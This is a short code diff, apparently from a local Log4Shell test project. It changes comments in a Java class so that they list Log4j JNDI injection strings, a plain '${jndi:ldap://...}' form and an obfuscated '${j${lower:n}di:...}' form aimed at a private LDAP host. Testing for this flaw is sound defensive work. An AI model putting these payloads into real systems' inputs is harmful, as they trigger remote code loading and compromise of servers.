@@ -18,9 +18,11 @@ class Home {
     return query;
   }
 
-  //${jndi:ldap://192.168.1.11:1389/a}
+  //naive form
+  //${jndi:ldap://192.168.1.1:11111/safelocaltest}
 
-  //URL Encoded
-  //%24%7Bjndi%3Aldap%3A%2F%2F192.168.1.11%3A1389%2Fa%7D
+  //other more complex forms
+  //${j${lower:n}di:ldap://192.168.1.11:11111/safelocaltest}
+
 
 }
